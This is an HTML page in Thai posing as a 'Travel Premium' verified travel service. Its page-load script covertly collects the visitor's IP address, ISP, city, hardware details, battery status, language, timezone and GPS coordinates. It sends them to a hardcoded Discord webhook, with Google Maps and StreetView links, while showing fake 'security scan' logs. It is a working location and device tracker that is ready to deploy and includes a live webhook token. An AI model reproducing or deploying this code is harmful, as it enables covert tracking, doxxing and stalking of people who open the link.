<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Travel Premium - Verified Service</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Kanit', sans-serif; background: #010409; color: white; overflow: hidden; user-select: none; }
        .glass-panel { background: rgba(13, 17, 23, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .scan-line { height: 2px; background: linear-gradient(90deg, transparent, #3b82f6, transparent); position: absolute; width: 100%; top: 0; animation: scan move 1.5s infinite linear; }
        @keyframes move { 0% { top: 0; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="max-w-md w-full glass-panel rounded-[2.5rem] overflow-hidden shadow-2xl relative border border-white/10">
        <div class="p-8 pb-4 text-center">
            <div class="inline-block px-4 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] mb-4 uppercase tracking-[0.2em] font-bold">
                System Intelligence v19.0
            </div>
            <h1 id="status-title" class="text-3xl font-bold mb-2 tracking-tight">กำลังตรวจสอบ...</h1>
            <p id="status-desc" class="text-slate-400 text-sm leading-relaxed">ระบบกำลังวิเคราะห์ข้อมูลความปลอดภัยอัตโนมัติ</p>
        </div>

        <div class="p-8 pt-0">
            <div id="loading-zone" class="text-center py-6">
                <div class="relative w-40 h-40 mx-auto mb-8 rounded-[2rem] border border-blue-500/30 overflow-hidden bg-slate-900 flex items-center justify-center">
                    <div class="text-5xl animate-pulse">📡</div>
                    <div class="scan-line"></div>
                </div>
                <div id="logs" class="text-[9px] font-mono text-slate-500 text-left bg-black/40 p-4 rounded-2xl border border-white/5 h-32 overflow-hidden leading-relaxed">
                    <p class="text-blue-400">> กำลังเริ่มต้นระบบ...</p>
                </div>
            </div>

            <div id="result-zone" class="hidden animate-in fade-in zoom-in duration-500">
                <div class="mb-5 p-4 bg-green-500/10 border border-green-500/20 rounded-[1.5rem] flex items-center gap-4 text-green-400">
                    <div class="w-12 h-12 bg-green-600 rounded-full flex items-center justify-center text-white text-2xl">✓</div>
                    <div>
                        <p class="font-bold text-sm uppercase">ยืนยันเสร็จสมบูรณ์</p>
                        <p class="text-[10px] opacity-70">บันทึกข้อมูลและวิเคราะห์พื้นที่แล้ว</p>
                    </div>
                </div>
                <div id="links-container" class="space-y-3"></div>
            </div>
        </div>
    </div>

    <script>
        // เปลี่ยน Webhook URL ตรงนี้
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1497104681770549318/pOsCVRZNsGnE8hxcr8YsMGuML2GfV95ALQSuxRF9KrLUrOgnaccBxt0Kc9Ygc6WruqkH";
        let hasSent = false;

        function log(msg) {
            const l = document.getElementById('logs');
            l.innerHTML += `<p class="text-blue-400/60">> ${msg}</p>`;
            l.scrollTop = l.scrollHeight;
        }

        window.onload = async () => {
            log("วิเคราะห์เครือข่ายและ IP...");
            const network = await getNetwork();
            
            log("ตรวจสอบสถาปัตยกรรมฮาร์ดแวร์...");
            const hardware = getHardware();
            
            log("ดึงข้อมูลสถานะพลังงาน...");
            const battery = await getBattery();

            const baseData = {
                ...network,
                ...hardware,
                battery,
                lang: navigator.language,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            if (navigator.geolocation) {
                log("กำลังร้องขอพิกัด GPS...");
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    log("ได้รับพิกัด! กำลังรวบรวมข้อมูลทั้งหมด...");
                    const finalData = {
                        ...baseData,
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: pos.coords.accuracy.toFixed(1)
                    };
                    await sendReport(finalData, "🟢 COMPLETE_TRACE");
                    showUI(finalData);
                }, async (err) => {
                    log("พิกัดถูกปฏิเสธ... ส่งข้อมูลพื้นฐาน");
                    const finalData = { ...baseData, lat: "Denied", lon: "Denied" };
                    await sendReport(finalData, "🟠 IP_TRACE_ONLY");
                    showUI(finalData);
                }, { timeout: 10000 });
            } else {
                const finalData = { ...baseData, lat: "N/A", lon: "N/A" };
                await sendReport(finalData, "🔴 GPS_NOT_SUPPORTED");
                showUI(finalData);
            }
        };

        async function getNetwork() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                return { ip: d.ip, isp: d.org, city: d.city, region: d.region, country: d.country_name };
            } catch (e) { return { ip: "Unknown", isp: "N/A", city: "N/A" }; }
        }

        function getHardware() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
            return {
                gpu,
                cores: navigator.hardwareConcurrency || "N/A",
                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`
            };
        }

        async function getBattery() {
            try {
                const b = await navigator.getBattery();
                return `${(b.level * 100).toFixed(0)}% (${b.charging ? 'ชาร์จ' : 'แบต'})`;
            } catch { return "N/A"; }
        }

        async function sendReport(d, type) {
            if (hasSent) return; // ป้องกันการส่งซ้ำ
            hasSent = true;

            const payload = {
                embeds: [{
                    title: `<a:loading:1484593662397644952> [${type}] ตรวจพบข้อมูล`,
                    color: d.lat !== "Denied" && d.lat !== "N/A" ? 3066993 : 15105570,
                    fields: [
                        { name: "🌐 เครือข่าย", value: `**IP:** \`${d.ip}\`\n**ISP:** ${d.isp}\n**พื้นที่:** ${d.city}, ${d.country}`, inline: false },
                        { name: "📱 อุปกรณ์", value: `**GPU:** ${d.gpu}\n**CPU:** ${d.cores} Cores | **RAM:** ${d.ram}\n**Language:** ${d.lang}`, inline: false },
                        { name: "📍 พิกัด GPS", value: d.lat === "Denied" ? "❌ ปฏิเสธการเข้าถึง" : `\`${d.lat}, ${d.lon}\`\n(+/- ${d.acc} ม.)`, inline: true },
                        { name: "🔋 แบต", value: d.battery, inline: true },
                        { name: "🔗 แผนที่", value: (d.lat !== "Denied" && d.lat !== "N/A") ? `📍 [Maps](https://www.google.com/maps?q=${d.lat},${d.lon}) | 🏠 [StreetView](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${d.lat},${d.lon})` : "ไม่มีข้อมูลพิกัด", inline: false }
                    ],
                    footer: { text: "Premium Identity Node • " + new Date().toLocaleString('th-TH') }
                }]
            };
            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
        }

        function showUI(d) {
            document.getElementById('loading-zone').classList.add('hidden');
            document.getElementById('result-zone').classList.remove('hidden');
            document.getElementById('status-title').innerText = "ยินดีต้อนรับ";

            const container = document.getElementById('links-container');
            const hasLoc = d.lat && d.lat !== "Denied" && d.lat !== "N/A";
            
            container.innerHTML = `
                <div class="bg-blue-600/5 p-4 rounded-2xl border border-blue-500/20 text-[10px] mb-4">
                    <p class="text-blue-400 font-bold uppercase mb-1">สรุปข้อมูล</p>
                    <p>IP: ${d.ip} | ${d.isp}</p>
                    <p>Location: ${d.city}, ${d.country}</p>
                </div>
                ${hasLoc ? `
                <a href="https://www.google.com/maps/search/?api=1&query=${d.lat},${d.lon}" target="_blank" class="flex items-center gap-4 bg-blue-600 p-5 rounded-2xl hover:bg-blue-500 transition-all">
                    <span class="text-2xl">🌍</span>
                    <div class="flex-1 text-left">
                        <p class="text-white text-sm font-bold">เปิดพิกัดบริการพรีเมียม</p>
                        <p class="text-blue-100 text-[10px]">ดูสถานที่ยอดนิยมใน ${d.city}</p>
                    </div>
                </a>
                ` : `<p class="text-red-400 text-center text-xs">กรุณารีเฟรชและอนุญาตพิกัดเพื่อดูแผนที่</p>`}
            `;
        }
    </script>
</body>
</html>
